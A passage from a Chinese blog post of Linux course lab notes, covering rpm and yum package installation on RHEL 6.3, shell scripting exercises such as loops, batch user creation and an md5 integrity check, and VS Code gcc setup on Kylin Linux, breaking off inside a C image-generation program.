alt="img"></p></li><li><p>找出RHEL6.3安装光盘Packages目录中的libjpeg、libjpeg-devel软件包对应的rpm文件，使用rpm查询命令并找出当安装这2个rpm包将会向Linux文件系统安装了哪些文件？</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps32.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps33.jpg" alt="img"></p></li><li><p>尝试使用rpm工具的安装命令安装SDL_image库对应的两个软件包： SDL_image-1.2.12-9.el6.i686.rpm、SDL_image-devel-1.2.12-9.el6.i686.rpm。</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps34.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps35.jpg" alt="img"></p></li><li><p>尝试使用rpm工具的安装命令安装SDL_image库对应的两个软件包： SDL-1.2.14-3.el6.i686.rpm、SDL-devel-1.2.14-3.el6.i686.rpm。</p></li></ol><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps36.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps37.jpg" alt="img"></p><ol start="10"><li><p>使用提供的yum本地源配置文件rhel-local.repo，配置RHEL6.3的安装光盘成为yum的本地源，并使用yum工具安装SDL-devel-1.2.14-3.el6.i686.rpm。</p><ul><li><p>复制rhel-local.repo到&#x2F;etc&#x2F;yum.repos.d目录；</p></li><li><p>执行yum  repolist查看yum是否正确配置本地yum源；</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps38.jpg" alt="img"></p></li><li><p>使用rpm工具查询当前系统是否安装软件包tree，如果已经安装，请尝试使用yum命令卸载tree，然后使用yum install tree命令安装tree软件包；</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps39.jpg" alt="img"></p></li><li><p>进入实验目录&#x2F;root&#x2F;lab6-xxx-xxx，执行以下命令安装rpm软件SDL-devel，注意观察安装过程中都安装了哪些软件包：<br>“yum  install  SDL-devel-1.2.14-3.el6.i686.rpm”</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps40.jpg" alt="img"></p></li></ul></li></ol><hr><h1 id="Linux-Shell脚本编程"><a href="#Linux-Shell脚本编程" class="headerlink" title="Linux Shell脚本编程"></a>Linux Shell脚本编程</h1><h2 id="系统变量"><a href="#系统变量" class="headerlink" title="系统变量"></a>系统变量</h2><p><code>$&#123;n&#125;</code>：位置变量</p><p><code>$?</code>：保存前一条 Shell 命令的执行返回值。通常0代表执行成功，非0代表执行有误</p><p><code>$*</code>：以&quot;$1 $2” 形式保存的所有的命令行参数，作为一个单独的变量</p><p><code>$@</code>：以&quot;$1” &quot;$2” 形式保存的所有命令行参数，作为一个集合使用</p><p><code>$0</code>：当前运行的脚本路径</p><p><code>$$</code>：返回当前进程的PID</p><hr><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token punctuation">(</span>value0 value1 value2 value3 <span class="token punctuation">..</span>.<span class="token punctuation">)</span>name<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>value0name<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>value1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>$&#123;ARRAY_NAME[n]&#125;</code>：取得数组中的元素</p><p><code>$&#123;#ARRAY_NAME[@]&#125;</code>或<code>$&#123;#ARRAY_NAME[*]&#125;</code>：取得数组元素的个数</p><p><code>$&#123;#ARRAY_NAME[n]&#125;</code>：取得数组中单个分量的长度</p><hr><h2 id="键入"><a href="#键入" class="headerlink" title="键入"></a>键入</h2><p>内部命令 <code>read</code>，用于从键盘读入变量</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">read</span> <span class="token parameter variable">-p</span> <span class="token string">"提示语句"</span> varname、<span class="token builtin class-name">read</span> <span class="token parameter variable">-n</span> 字符个数 varname<span class="token builtin class-name">read</span> <span class="token parameter variable">-t</span> 时间 varname<span class="token comment"># 等待时间</span><span class="token builtin class-name">read</span> <span class="token parameter variable">-s</span> varname<span class="token comment"># 关闭回显</span><span class="token builtin class-name">read</span> <span class="token parameter variable">-a</span> arrayname<span class="token comment"># 输入数组</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="数学运算"><a href="#数学运算" class="headerlink" title="数学运算"></a>数学运算</h2><p><code>let</code>命令：在完整的赋值型数学表达式前加上 let 命令，就可以完成整数运算表达式的计算并赋值</p><p><code>expr</code>命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">expr</span> 操作数 运算符 操作数<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>$(())</code>与<code>$[]</code>：数学表达式计算</p><p><code>bc</code>：浮点数计算</p><hr><h2 id="实验-2"><a href="#实验-2" class="headerlink" title="实验"></a>实验</h2><ol><li><p>编写shell脚本count-fix.sh，实现计算1+2+3+4+5+6+7+8+…+100的和，并输出到屏幕上,分别使用for循环，while循环编写</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token assign-left variable">sum_for</span><span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> <span class="token variable"><span class="token punctuation">((</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span><span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">))</span></span><span class="token keyword">do</span>    <span class="token assign-left variable">sum_for</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span>sum_for <span class="token operator">+</span> i<span class="token variable">))</span></span><span class="token keyword">done</span><span class="token builtin class-name">echo</span> <span class="token string">"for: <span class="token variable">$sum_for</span>"</span><span class="token assign-left variable">sum_while</span><span class="token operator">=</span><span class="token number">0</span><span class="token assign-left variable">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token keyword">while</span> <span class="token punctuation">[</span> <span class="token variable">$j</span> <span class="token parameter variable">-le</span> <span class="token number">100</span> <span class="token punctuation">]</span><span class="token keyword">do</span>    <span class="token assign-left variable">sum_while</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span>sum_while <span class="token operator">+</span> j<span class="token variable">))</span></span>    <span class="token assign-left variable">j</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token variable">))</span></span><span class="token keyword">done</span><span class="token builtin class-name">echo</span> <span class="token string">"while: <span class="token variable">$sum_while</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>使用bash的for循环语句编写一脚本batchmkdir.sh，能实现以下功能：在当前目录中建立10个目录，目录的命名形式为dir-1、dir-2、dir-3、…..dir-20，在程序中注意先判断待建立的目录是否已经存在。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">for</span> <span class="token variable"><span class="token punctuation">((</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">))</span></span><span class="token keyword">do</span>    <span class="token assign-left variable">dir_name</span><span class="token operator">=</span><span class="token string">"dir-<span class="token variable">$i</span>"</span>    <span class="token comment"># 检查目录是否已存在</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token parameter variable">-d</span> <span class="token string">"<span class="token variable">$dir_name</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token function">mkdir</span> <span class="token string">"<span class="token variable">$dir_name</span>"</span>    <span class="token keyword">fi</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>编写一个shell脚本count.sh，实现如下功能，用户可以在count.sh脚本后面跟不同数字的命令行参数，使得脚本能计算不同数字的连加和，并在脚本中注意判断用户是否输入了一个参数，如当用户以“.&#x2F;count.sh 30”运行脚本时，能计算1+2+3+4+…+30，如果用户没有输入参数，则默认计算1到10的连加和。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$#</span> <span class="token parameter variable">-eq</span> <span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token assign-left variable">end_num</span><span class="token operator">=</span><span class="token number">10</span><span class="token keyword">else</span>    <span class="token assign-left variable">end_num</span><span class="token operator">=</span><span class="token variable">$1</span><span class="token keyword">fi</span><span class="token assign-left variable">sum</span><span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> <span class="token variable"><span class="token punctuation">((</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>$end_num<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">))</span></span><span class="token keyword">do</span>    <span class="token assign-left variable">sum</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span>sum <span class="token operator">+</span> i<span class="token variable">))</span></span><span class="token keyword">done</span><span class="token builtin class-name">echo</span> <span class="token string">"和为: <span class="token variable">$sum</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>编写一个脚本batchuser.sh，能批量建立10个用户帐号，并给用户帐号设定8位的随机密码，同时把该用户名与密码保存到指定的文件中&#x2F;root&#x2F;user-pass.txt，以便管理员分发密码；其中帐号的形式为user1、user2、…user10；保存用户名与密码的文件的每行的格式形式为：user1:ChczVZww</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">for</span> <span class="token variable"><span class="token punctuation">((</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">))</span></span><span class="token keyword">do</span>    <span class="token assign-left variable">username</span><span class="token operator">=</span><span class="token string">"user<span class="token variable">$i</span>"</span>    <span class="token assign-left variable">password</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>openssl rand <span class="token parameter variable">-base64</span> <span class="token number">6</span><span class="token variable">)</span></span>    <span class="token function">useradd</span> <span class="token parameter variable">-m</span> <span class="token variable">$username</span>    <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token variable">$password</span><span class="token entity" title="\n">\n</span><span class="token variable">$password</span>"</span> <span class="token operator">|</span> <span class="token function">passwd</span> <span class="token variable">$username</span> <span class="token parameter variable">--stdin</span>    <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$username</span>:<span class="token variable">$password</span>"</span> <span class="token operator">>></span> /root/user-pass.txt<span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>编写一个shell脚本，实现以下功能：该脚本能读取usernamelist.txt中的用户列表（一行一个用户名）建立帐号，并给每个帐号设置8位随机密码，同时把该用户名与密码保存到指定userpass.txt 文件中，密码文件的格式同第4题的要求。要求要跳过空行。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">while</span> <span class="token assign-left variable"><span class="token environment constant">IFS</span></span><span class="token operator">=</span> <span class="token builtin class-name">read</span> <span class="token parameter variable">-r</span> username<span class="token keyword">do</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-z</span> <span class="token string">"<span class="token variable">$username</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token builtin class-name">continue</span>    <span class="token keyword">fi</span>    <span class="token assign-left variable">password</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>openssl rand <span class="token parameter variable">-base64</span> <span class="token number">6</span><span class="token variable">)</span></span>    <span class="token function">useradd</span> <span class="token parameter variable">-m</span> <span class="token variable">$username</span>    <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token variable">$password</span><span class="token entity" title="\n">\n</span><span class="token variable">$password</span>"</span> <span class="token operator">|</span> <span class="token function">passwd</span> <span class="token variable">$username</span> <span class="token parameter variable">--stdin</span>    <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$username</span>:<span class="token variable">$password</span>"</span> <span class="token operator">>></span> userpass.txt<span class="token keyword">done</span> <span class="token operator">&lt;</span> <span class="token string">"usernamelist.txt"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>脚本capprintfile.sh</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">for</span> <span class="token for-or-select variable">file</span> <span class="token keyword">in</span> <span class="token string">"<span class="token variable">$@</span>"</span><span class="token keyword">do</span> <span class="token builtin class-name">echo</span> <span class="token variable">$file</span><span class="token operator">|</span><span class="token function">tr</span> a-z A-Z<span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>建立目录 &#x2F;root&#x2F;lab-shell&#x2F;，并使用 touch 命令建立一些空文件或者使用 mkdir 建立一些目录，然后以<code>./capprintfile.sh /  /root/lab-shell/*</code> 的形式运行脚本，观察结果</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps25.jpg" alt="img"></p><p>编写一个脚本，能把指定目录&#x2F;root&#x2F;lab-shell&#x2F;中的文件的文件名全改名为大写，并测试运行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token builtin class-name">cd</span> /root/lab-shell/<span class="token keyword">for</span> <span class="token for-or-select variable">file</span> <span class="token keyword">in</span> *<span class="token keyword">do</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-f</span> <span class="token string">"<span class="token variable">$file</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token assign-left variable">new_name</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$file</span>"</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token string">'[:lower:]'</span> <span class="token string">'[:upper:]'</span><span class="token variable">)</span></span>        <span class="token function">mv</span> <span class="token string">"<span class="token variable">$file</span>"</span> <span class="token string">"<span class="token variable">$new_name</span>"</span>    <span class="token keyword">fi</span><span class="token keyword">done</span><span class="token builtin class-name">echo</span> <span class="token string">"Finished"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>设计一个脚本checkmd5.sh，实现用于检测Linux系统某些特定重要文件是否被修改的功能</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$#</span>"</span> <span class="token parameter variable">-ne</span> <span class="token number">1</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token builtin class-name">echo</span> <span class="token string">"Usage: <span class="token variable">$0</span> &lt;file_list_with_md5sum>"</span>    <span class="token builtin class-name">exit</span> <span class="token number">1</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token parameter variable">-f</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token builtin class-name">echo</span> <span class="token string">"Error: 文件列表不存在."</span>    <span class="token builtin class-name">exit</span> <span class="token number">1</span><span class="token keyword">fi</span><span class="token keyword">while</span> <span class="token assign-left variable"><span class="token environment constant">IFS</span></span><span class="token operator">=</span> <span class="token builtin class-name">read</span> <span class="token parameter variable">-r</span> line<span class="token keyword">do</span>    <span class="token assign-left variable">file</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$line</span>"</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $1&#125;'</span><span class="token variable">)</span></span>    <span class="token assign-left variable">expected_md5</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$line</span>"</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $2&#125;'</span><span class="token variable">)</span></span>        <span class="token assign-left variable">current_md5</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>md5sum <span class="token string">"<span class="token variable">$file</span>"</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $1&#125;'</span><span class="token variable">)</span></span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$current_md5</span>"</span> <span class="token operator">!=</span> <span class="token string">"<span class="token variable">$expected_md5</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token builtin class-name">echo</span> <span class="token string">"文件 <span class="token variable">$file</span> 已被修改！"</span>    <span class="token keyword">else</span>        <span class="token builtin class-name">echo</span> <span class="token string">"文件 <span class="token variable">$file</span> 未被修改。"</span>    <span class="token keyword">fi</span><span class="token keyword">done</span> <span class="token operator">&lt;</span> <span class="token string">"<span class="token variable">$1</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment"># 检查参数是否正确</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$#</span> <span class="token parameter variable">-ne</span> <span class="token number">1</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token builtin class-name">echo</span> <span class="token string">"Usage: <span class="token variable">$0</span> &lt;ip_list_file>"</span>    <span class="token builtin class-name">exit</span> <span class="token number">1</span><span class="token keyword">fi</span><span class="token assign-left variable">ip_list_file</span><span class="token operator">=</span><span class="token variable">$1</span><span class="token comment"># 检查文件是否存在</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token parameter variable">-f</span> <span class="token string">"<span class="token variable">$ip_list_file</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token builtin class-name">echo</span> <span class="token string">"Error: File <span class="token variable">$ip_list_file</span> not found."</span>    <span class="token builtin class-name">exit</span> <span class="token number">1</span><span class="token keyword">fi</span><span class="token comment"># 逐行读取 IP 地址并进行 ping 测试</span><span class="token keyword">while</span> <span class="token assign-left variable"><span class="token environment constant">IFS</span></span><span class="token operator">=</span> <span class="token builtin class-name">read</span> <span class="token parameter variable">-r</span> <span class="token function">ip</span><span class="token punctuation">;</span> <span class="token keyword">do</span>    <span class="token builtin class-name">echo</span> <span class="token string">"Pinging IP: <span class="token variable">$ip</span>"</span>    <span class="token function">ping</span> <span class="token parameter variable">-c</span> <span class="token number">1</span> <span class="token variable">$ip</span> <span class="token operator">></span> /dev/null    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$?</span> <span class="token parameter variable">-eq</span> <span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token builtin class-name">echo</span> <span class="token string">"Ping successful"</span>    <span class="token keyword">else</span>        <span class="token builtin class-name">echo</span> <span class="token string">"Ping failed"</span>    <span class="token keyword">fi</span><span class="token keyword">done</span> <span class="token operator">&lt;</span> <span class="token string">"<span class="token variable">$ip_list_file</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="Linux-gcc源码编译"><a href="#Linux-gcc源码编译" class="headerlink" title="Linux gcc源码编译"></a>Linux gcc源码编译</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>在新版本的Linux发行版中，这里选择银河麒麟，安装配置vscode，尝试配置好c&#x2F;c++的编程开发环境</p><p>在vscode官网上下载deb：<a href="https://code.visualstudio.com/docs/?dv=linux64_deb">https://code.visualstudio.com/docs/?dv=linux64_deb</a></p><p>然后安装</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> dpkg <span class="token parameter variable">-i</span> code_1.95.3-1731513102_amd64.deb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241203203646070.png" alt="image-20241203203646070"></p><p>接下来配置c&#x2F;c++的开发环境</p><p>先准备好 gcc ， g++ 和 gdb</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241203204406397.png" alt="image-20241203204406397"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241203214320992.png" alt="image-20241203214320992"></p><p>然后在vscode扩展商店下载相关扩展</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241203205157452.png" alt="image-20241203205157452"></p><p>接下来在工作区生成launch.json和tasks.json</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token comment">// Use IntelliSense to learn about possible attributes.</span>    <span class="token comment">// Hover to view descriptions of existing attributes.</span>    <span class="token comment">// For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"0.2.0"</span><span class="token punctuation">,</span>    <span class="token property">"configurations"</span><span class="token operator">:</span> <span class="token punctuation">[</span>         <span class="token punctuation">&#123;</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"g++ - Build and debug active file"</span><span class="token punctuation">,</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"cppdbg"</span><span class="token punctuation">,</span>            <span class="token property">"request"</span><span class="token operator">:</span> <span class="token string">"launch"</span><span class="token punctuation">,</span>            <span class="token property">"program"</span><span class="token operator">:</span> <span class="token string">"$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;"</span><span class="token punctuation">,</span>            <span class="token property">"args"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"stopAtEntry"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"cwd"</span><span class="token operator">:</span> <span class="token string">"$&#123;fileDirname&#125;"</span><span class="token punctuation">,</span>            <span class="token property">"environment"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"externalConsole"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"MIMode"</span><span class="token operator">:</span> <span class="token string">"gdb"</span><span class="token punctuation">,</span>            <span class="token property">"setupCommands"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token punctuation">&#123;</span>                    <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Enable pretty-printing for gdb"</span><span class="token punctuation">,</span>                    <span class="token property">"text"</span><span class="token operator">:</span> <span class="token string">"-enable-pretty-printing"</span><span class="token punctuation">,</span>                    <span class="token property">"ignoreFailures"</span><span class="token operator">:</span> <span class="token boolean">true</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"preLaunchTask"</span><span class="token operator">:</span> <span class="token string">"C/C++: g++ build active file"</span><span class="token punctuation">,</span>            <span class="token property">"miDebuggerPath"</span><span class="token operator">:</span> <span class="token string">"/usr/bin/gdb"</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"2.0.0"</span><span class="token punctuation">,</span>    <span class="token property">"tasks"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"cppbuild"</span><span class="token punctuation">,</span>            <span class="token property">"label"</span><span class="token operator">:</span> <span class="token string">"C/C++: g++ build active file"</span><span class="token punctuation">,</span>            <span class="token property">"command"</span><span class="token operator">:</span> <span class="token string">"/usr/bin/g++"</span><span class="token punctuation">,</span>            <span class="token property">"args"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token string">"-g"</span><span class="token punctuation">,</span>                <span class="token string">"$&#123;file&#125;"</span><span class="token punctuation">,</span>                <span class="token string">"-o"</span><span class="token punctuation">,</span>                <span class="token string">"$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;"</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"options"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"cwd"</span><span class="token operator">:</span> <span class="token string">"$&#123;fileDirname&#125;"</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"problemMatcher"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token string">"$gcc"</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"group"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"kind"</span><span class="token operator">:</span> <span class="token string">"build"</span><span class="token punctuation">,</span>                <span class="token property">"isDefault"</span><span class="token operator">:</span> <span class="token boolean">true</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"detail"</span><span class="token operator">:</span> <span class="token string">"compiler: /usr/bin/g++"</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后f5调试与编译</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241203214446936.png" alt="image-20241203214446936"></p><hr><h2 id="实验1"><a href="#实验1" class="headerlink" title="实验1"></a>实验1</h2><p>math_pic_png.c 是一个能够自动生成一张 1024*1024 的数学分形图像的c代码，生成的图像效果如 math_png_rgb.png 文件所示</p><p>尝试在 rhel 6.3、ubuntu18.04 中编译出可执行程序，并测试运行</p><p>math_pic_png.c</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;time.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;png.h></span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">pixel_RGB</span> <span class="token punctuation">&#123;</span>    png_byte red<span class="token punctuation">,</span> green<span class="token punctuation">,</span> black<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> pixel_RGB<span class="token punctuation">;</span><span class="token class-name">uint8_t</span> <span class="token function">random_uint8</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">write_data_to_png</span><span class="token 